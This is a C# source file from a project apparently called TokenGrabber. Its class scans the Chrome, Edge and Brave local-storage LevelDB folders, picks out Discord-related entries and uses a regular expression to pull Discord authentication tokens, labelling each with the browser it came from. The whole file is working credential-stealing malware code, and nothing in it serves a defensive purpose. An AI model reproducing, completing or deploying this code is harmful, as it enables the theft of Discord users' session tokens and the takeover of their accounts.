namespace TokenGrabber.Grabbers;

using System.Text.RegularExpressions;
using TokenGrabber.Models;
using TokenGrabber.Utils;

internal sealed partial class BrowserTokenGrabber : ITokenGrabber
{
    private static readonly string[] BrowserLevelDbPaths =
    [
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb")
    ];

    public List<GrabbedToken> Extract()
    {
        var tokens = new List<GrabbedToken>();

        foreach (var dbPath in BrowserLevelDbPaths)
        {
            if (!Directory.Exists(dbPath)) continue;

            var entries = LevelDbParser.ReadAllEntries(dbPath);
            var discordEntries = entries
                .Where(e => e.Key.Contains("discord", StringComparison.OrdinalIgnoreCase));

            foreach (var entry in discordEntries)
            {
                var matches = DiscordTokenRegex().Matches(entry.Value);
                foreach (Match match in matches)
                {
                    tokens.Add(new GrabbedToken
                    {
                        Token = match.Value,
                        Platform = "Discord",
                        Source = $"Browser:{GetBrowserName(dbPath)}",
                        ExtractedAt = DateTime.UtcNow
                    });
                }
            }
        }

        return tokens.DistinctBy(t => t.Token).ToList();
    }

    private static string GetBrowserName(string path) => path switch
    {
        var p when p.Contains("Chrome") => "Chrome",
        var p when p.Contains("Edge") => "Edge",
        var p when p.Contains("Brave") => "Brave",
        _ => "Unknown"
    };

    [GeneratedRegex(@"(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27,})", RegexOptions.Compiled)]
    private static partial Regex DiscordTokenRegex();
}
